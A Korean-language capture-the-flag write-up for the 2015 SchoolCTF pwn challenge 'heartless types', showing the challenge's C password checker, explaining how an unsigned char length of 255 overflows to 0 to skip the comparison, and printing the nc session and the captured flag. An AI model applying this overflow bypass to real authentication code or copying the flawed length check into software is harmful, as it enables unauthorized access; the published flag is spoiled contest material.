============================================================================================================
[2015_schoolctf] [PWN] heartless types
============================================================================================================

문제에 C 파일이 하나 제공되는데, flag 와 stored_pass에는 *** 라고 되어 있지만 서버에는 정상적인 문자들이 들어가 있습니다.

.. code-block:: c

    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
     
    char stored_pass[] = "***";
    char flag[] = "***";
     
    int main()
    {
        unsigned char password_len;
        puts("Enter password len :");
        scanf("%d\n", &password_len);
        
        if (password_len == 0) {
            puts("Password can't be 0 characters long");
            return 1;
        }
     
        char *pass;
        pass = malloc((int)password_len + 1);
        int i;
        for (i = 0; i < password_len; ++i) {
            pass[i] = fgetc(stdin);
        }
        
        int stored_pass_len = strlen(stored_pass) + 1;
        ++password_len;
        int min_len = (password_len < stored_pass_len) ? password_len : stored_pass_len; <--
        for (i = 0; i < min_len; ++i) {
            if (pass[i] != stored_pass[i]) {
                puts("Wrong pass!");
                return 1;
            }
        }
        puts(flag);
        return 0;
    }


문제를 보면 사용자에게 "password 길이"를 정수로 받고, 
해당 길이 만큼 한글자씩 입력 후 stored_pass 와 같은지 비교하여 
다 맞으면 flag를 주고 하나라도 틀리면 Wrong pass! 를 출력합니다.

여기서 취약점은 min_len 에 있습니다. 

for문의 횟 수가 password_len 또는 stored_pass_len 중에 더 작은 길이를 갖는 횟 수로 돌게 되는데, 
이 때 password_len 의 타입이 unsigned char(0~255)이기 때문에 정수 오버플로우를 이용하여 
password_len을 0 으로 만들 수 있고, passwrd_len 이 0 이기 때문에 
for문은 돌지 않고 바로 flag를 출력하게 됩니다.

따라서, 입력 password length 를 255 (1바이트 갖는 최대 값)로 넣어 주고 254이상 아무 글자가
 입력하면 ++password_len 때문에 255가 1 증가 하면서 0 이 되어 for문을 돌지 않고 바로 
 puts(flag)를 하게 됩니다.


.. code-block:: console

    $ nc sibears.ru 12013

    Enter password len :
    255
    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
    
    Flag is thanks_god_we_got_not_only_binaries
